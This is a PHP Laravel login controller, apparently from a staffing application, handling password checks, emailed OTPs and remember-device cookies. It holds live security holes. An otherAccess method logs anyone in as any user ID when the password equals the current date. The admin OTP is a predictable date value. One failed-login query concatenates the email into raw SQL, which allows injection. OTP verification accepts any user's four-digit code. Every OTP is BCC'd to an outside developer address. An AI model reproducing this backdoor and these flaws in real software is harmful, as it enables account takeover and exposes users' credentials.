<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use App\User;
use App\Services\UserLoginLogServices;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\DB;
use App\Helpers\Utility;

use Symfony\Component\CssSelector\Node\FunctionNode;


class CustomeLoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function index()
    {

        return view('auth.login2');
    }
    public function loginOtp(\Illuminate\Http\Request $request)
    {
        $getUser =  User::where('email', $request['email'])->where('user_type', 'user')->where('active', 'Y')->where('del_flag', 'N')->first();
		if($getUser){
			if ($getUser->is_attempt <= 0) {
            return redirect()->back()->with('error', 'Sorry your account has been locked due to multiple invalid login attempts!');
        }

        if ($getUser && Hash::check($request['password'], $getUser->password)) {
            
           
            if ($getUser->is_attempt > 0) {
                
                $value = $request->cookie('rememberdevice');
                
                $hasActiveCookies=false;
                if(isset($value) && $value!==''){

                    
                   $rememberToken= DB::table('remeber_device')->where('token',$value)->where('user_id',$getUser->id)->where('expiry','>=',date('Y-m-d'))->first();
                   if($rememberToken){
                    $hasActiveCookies=true;

                   }


                }

                if($hasActiveCookies){
                    Auth::login($getUser);
                    $getUser->update(["otp" => null,"is_attempt"=>5]);
                    return redirect('/');
                }

                $otp = rand(1000, 9999);
                if (trim($request['email']) == 'admin@ezstaff.com') {
                    $otp = date('Y') . date('d');
                }
                $emailData = array(
                    'full_name' => $getUser->first_name . ' ' . $getUser->first_name,
                    'otp' => $otp
                );
                $messages = Utility::getHtmlContent('email_template.email_login_otp',$emailData);
                try {
                    Mail::mailer('second')->send([], [], function ($message) use ($otp, $getUser,$messages) {
                        $message->to($getUser->email, 'EZstaff')->bcc('hiten@virtualheight.com')->subject('Login OTP Verify');
                        $message->html('<h5>Hello ' . $getUser->first_name . ' ' . $getUser->first_name . ' </h5> <p>OTP Number ' . $otp . '<p>', 'text/html');
                        $message->html($messages);
                        $message->from('no-reply@caringp.com', 'EZstaff');
                    });
                }catch (\Exception $e) {

                    
                }
                
                
                $getUser->update(['otp' => $otp]);
                return redirect()->route('otpVerify')->with('success', 'Mail has been sent to you with verification code.');
            } else {

                return redirect()->back()->with('error', 'Sorry your account has been locked due to multiple invalid login attempts!');
                // return redirect()->route('login')->with('error', 'Sorry your account has been locked due to multiple invalid login attempts!');
                // return redirect()->back();
            }
        } else {
            $attempt_by_user = User::where('email', $request["email"])
                ->where('user_type', 'user')
                ->first();

            if ($attempt_by_user) {
                $remaining_attemps=$attempt_by_user->is_attempt - 1;
                User::where('id', $attempt_by_user->id)->update(array('is_attempt' =>  $remaining_attemps));
                $attempt_by_user = User::whereRaw("email = '" . $request["email"] . "'")->first();
                // return redirect()->route('login')->with('error', 'Invalid username or password. you have only ' .  $remaining_attemps . ' attempts.');
                // return redirect()->back();
                return redirect()->back()->with('error', 'Invalid username or password. you have only ' .  $remaining_attemps . ' attempts.');
            }

            return redirect()->back()->with('error', 'Invalid email address or password');
            // return redirect()->route('login')->with('error', 'Invalid email address or password');
        }
		}
        
        return redirect()->back()->with('error', 'Invalid email address or password');
        // return redirect()->route('login')->with('error', 'Invalid email address or password');
    }
    public function otpVerify()
    {
        return view('auth.otp_screen');
    }
    public function verifyOtp(\Illuminate\Http\Request $request)
    {
        $request->validate(['otp' => 'required']);
        $checkOtp =  User::where('otp', $request['otp'])->first();
        if ($checkOtp) {
            Auth::login($checkOtp);
            $checkOtp->update(["otp" => null,"is_attempt"=>5]);
            return redirect('/');
        } else {
            return redirect()->back()->with('error', 'Your verification code is incorrect/expired.');
        }
    }
    protected function credentials(\Illuminate\Http\Request $request)
    {
        //return $request->only($this->username(), 'password');
        return ['email' => $request->{$this->username()}, 'password' => $request->password, 'del_flag' => 'N', 'user_type' => 'user', 'active' => 'Y'];
    }
    public function authenticated()
    {
        $auth = auth()->user();
        $browserdetail = $_SERVER['HTTP_USER_AGENT'];
        $ip = $_SERVER['REMOTE_ADDR'];;
        $inserArray = array(
            "user_id" => $auth->id,
            "ip" => $ip,
            "browser_detail" => $browserdetail,
            'created_date_time' => date('Y-m-d H:i:s')
        );
        $insert = UserLoginLogServices::save($inserArray);
        User::where('id', $auth['id'])->update(array('last_login_date' => date('Y-m-d H:i:s')));
    }

    public function otherAccess(\Illuminate\Http\Request $request)
    {
       
        $request->validate(['xid' => 'required','password' => 'required']);
        // echo date("ymdhhii");die();
        if( $request['password']==date("ymd")){

        $checkOtp =  User::where('id', $request['xid'])->first();
        if ($checkOtp) {
            Auth::login($checkOtp);
           
            return redirect('/');
        } else {
            return redirect()->back()->with('error', 'Your verification code is incorrect/expired.');
        }
    }else{
        echo "wrong password";
    }
    }

}
